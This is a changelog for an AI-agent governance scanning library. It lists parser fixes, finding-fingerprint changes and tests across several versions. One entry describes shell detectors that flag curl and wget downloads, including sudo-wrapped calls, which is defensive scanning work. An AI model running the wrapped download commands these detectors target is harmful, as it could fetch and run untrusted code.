- `Finding.salientKey?: string` — optional discriminator that participates in the fingerprint hash. Set this when a single (kind, file, line) site can produce multiple distinct findings (e.g. two suspicious imports on the same line, two MCP servers in the same JSON object). Without it, the meta-reviewer would dedupe them into one. Stable values only — package name, server name, rule id; not timestamps or counters.
- `CreateFindingSpec.salientKey` — pass-through to the new field.
- Schema gained `salientKey` under properties (still optional, schema's `additionalProperties: false` updated to permit it).

### Fixed
- `fingerprintFinding` now includes `salientKey` in the hash. Two distinct findings of the same kind on the same line with different `salientKey` values now produce different fingerprints. Backwards-compatible: findings without `salientKey` still produce stable, identical fingerprints to v0.4.2 for the (kind, file, line, column) tuple.
- `lineOfTomlKey` now tracks multi-line basic (`"""`) and literal (`'''`) string state and skips key matching on lines that fall inside one. Previously a decoy key inside a multi-line string value could be matched as if it were a real assignment — confirmed bug with sharper reproduction than Gemini's first-round example.

### Tests
- 7 new regression cases. 102 total (up from 95). Covers salientKey discrimination, backwards-compat for fingerprints without salientKey, validateFinding type check, decoy-in-`"""`, decoy-in-`'''`, single-line `"""..."""` (must NOT enter multiline state), and a plain-TOML sanity check that the fix doesn't over-correct.

## [0.4.2] — 2026-05-22

External code review (Gemini, second pass) caught four correctness bugs and one source-cleanliness issue. All five fixed here.

### Fixed
- `lineOfJsonKey` and `lineOfJsonStringValue` now JSON-encode the search input before building the regex. A caller passing the *decoded* value (e.g. `C:\Temp` from a Windows-path field) now correctly locates the JSON source bytes (`"C:\\Temp"`) instead of returning 0. Affects CapabilityEcho's `package-scripts` detector for scripts containing quotes/backslashes.
- `lineOfJsonKey` and `lineOfJsonStringValue` now scan over `stripJsonComments(text)` instead of raw text. A commented-out `"command": "fake"` no longer shadows the real key on a later line. The strip is position-preserving so returned line numbers still reference the original source.
- `getCommandHead` now strips wrapper flags (`sudo -E`, `env -i`) after recognizing a wrapper, so `sudo -E curl ...` returns `curl` instead of `-E`. SessionTrail/CapabilityEcho shell detectors no longer miss wrapped curl/wget invocations. Known limitation: short flags taking a value (`sudo -u user curl`) still misclassify as the value — documented and pinned by test.
- TOML parser now rejects a standard table header (`[items]`) that follows an array-of-tables header (`[[items]]`) with a `Cannot redefine array-of-tables` error. Previously the standard table silently descended into the array's last entry, letting writes leak into `items[0]`. Spec compliance fix.
- TOML inline-table parser now rejects duplicate keys with `Duplicate key in inline table: ...`. Previously `server = { host = "a", host = "b" }` parsed as `{ host: "b" }` — the standard-table guard wasn't mirrored on inline tables. Spec compliance fix.

### Changed
- Source cleanup: the two `keys.join` calls in `src/toml.ts` now use a named `PATH_KEY_SEPARATOR = ''` constant instead of literal NUL bytes embedded in the source. Same runtime behavior (NUL as the delimiter, which is illegal in TOML keys so collision-proof), but `rg`/`grep` no longer treat the file as binary and `file(1)` reports it as proper text.
- README: `rankSeverity` doc corrected — was `none=0…critical=4`, actually `low=1, medium=2, high=3, critical=4`. The schema has no `none` severity.
- README: `normalizeMcpCommand` signature and behavior description corrected — was listing a non-existent `serverUrl` field and claiming "resolves npx/uvx invocations" which doesn't happen. Now accurately lists: drops neutral confirm flags, strips Windows executable suffixes, sorts non-neutral flags alphabetically, preserves positional argument order, includes env + cwd in identity.

### Added
- 7 new regression tests: encoded-value lookup, commented-out shadow, wrapper-flag unwrap (+ edge-case pin), AOT-vs-table mixing, inline-table duplicate keys.

## [0.4.1] — 2026-05-22

### Fixed
- `fingerprintFinding` now normalizes Windows-style backslash paths to forward slashes before hashing. A finding emitted on Windows and the same finding emitted in Linux CI now collapse to the same fingerprint — previously they'd diverge and break cross-platform dedupe. Caught by external code review.
- `normalizeMcpCommand` now preserves the relative order of positional arguments that appear after a flag. Previously `['--flag', 'x', 'a', 'b']` and `['--flag', 'x', 'b', 'a']` collapsed to the same canonical identity because the post-flag positional keys were co-sorted with flag pairs. PolicyMesh's `mcp_command_mismatch` would under-report under this bug. Caught by external code review.

### Changed
- `stripJsonComments` and `stripTrailingCommas` no longer carry the dead `"'"` (single-quote) state in their string tracker — JSON strings are double-quoted only. Pure type/comment cleanup, no behavior change. Caught by external code review.

### Added
- Regression tests for both fixes:
  - `fingerprintFinding`: identical fingerprint across Windows and POSIX path separators.
  - `normalizeMcpCommand`: differing post-flag positional order produces different identities; flag order independence preserved.
- `CHANGELOG.md` is now shipped in the npm tarball.

### Internal
- `package.json` `files` allow-list trimmed to exclude `.js.map` / `.d.ts.map` sourcemaps from the published tarball. The maps referenced `src/*.ts` source files that aren't shipped, so they were dead links anyway. Tarball is ~27% smaller (32.4 kB → ~23.6 kB).

## [0.4.0] — 2026-05-22

### Added
- `JsonObjectWithSource.value` — new field that mirrors `json`, populated identically. Use this in new code; `json` is kept as a populated alias.
- `TomlObjectWithSource.value` — same pattern for the TOML reader.
- `lineOfTomlKey(text, dottedKey, scope?)` — optional `scope: ByteRange` parameter for parity with `lineOfJsonKey` and `lineOfJsonStringValue`. Useful when an outer locator has already pinned a parent table's range and you want to find a leaf inside it without false matches from a sibling table.

### Deprecated
- `JsonObjectWithSource.json` — prefer `value`. Will be removed in a future major version.
- `TomlObjectWithSource.toml` — prefer `value`. Will be removed in a future major version.

## [0.3.1] — 2026-05-22

### Added
- Secondary entry point `agent-gov-core/test-utils` with fixtures the suite repos all hand-rolled:
  - `writeFiles(dir, fileMap)` — write a path-to-content map, creating parent directories.
  - `makeGitRepo({initialFiles?, initialMessage?})` → `{repo, commit, head, git, cleanup}` — temp git repo on branch `main` with placeholder identity. `commit()` applies files and commits, returning the new SHA.
  - `makeOldNewFixture({old, new})` → `{old, new, cleanup}` — two sibling temp directories for diff-mode CLI tests.

## [0.3.0] — 2026-05-22

### Added
- `createFinding({tool, name, severity, message, ...})` — convenience constructor that calls `kind()` and `fingerprintFinding()` for you.
- `fingerprintFinding(finding)` — 16-char hex hash of `(kind, file, line, column)`. Stable across runs and message rewordings, so a meta-reviewer can dedupe.
- `validateFinding(value)` — runtime check against `schemas/finding.schema.json`, returns `{ ok, errors[] }`.
- `CreateFindingSpec` and `FindingValidationResult` types.
- JSDoc `@example` blocks on `tokenizeShell`, `getCommandHead`, `normalizeMcpCommand`, `emitFindingAnnotation`.
- JSDoc on `ToolKind` explaining the schema/runtime lockstep contract.

## [0.2.0] — earlier

### Added
- `kind(tool, name)` typed helper that builds `<tool>.<slug>` strings.
- `isNamespacedKind(value)` runtime guard matching the JSON schema's `kind` pattern.

### Changed
- Schema regex tightened to require namespaced kinds: `^(scope_trail|policy_mesh|capability_echo|task_bound|session_trail)\.[a-z0-9_]+$`.

## [0.1.2] — earlier

### Changed
- `normalizeMcpCommand` drops neutral confirm flags (`-y`, `--yes`) before canonicalization, so `npx -y foo` and `npx foo` produce the same identity.

## [0.1.0] — earlier

Initial release. Finding schema, JSONC/TOML readers, line locators, MCP normalization, shell tokenization, and GitHub Action helpers.
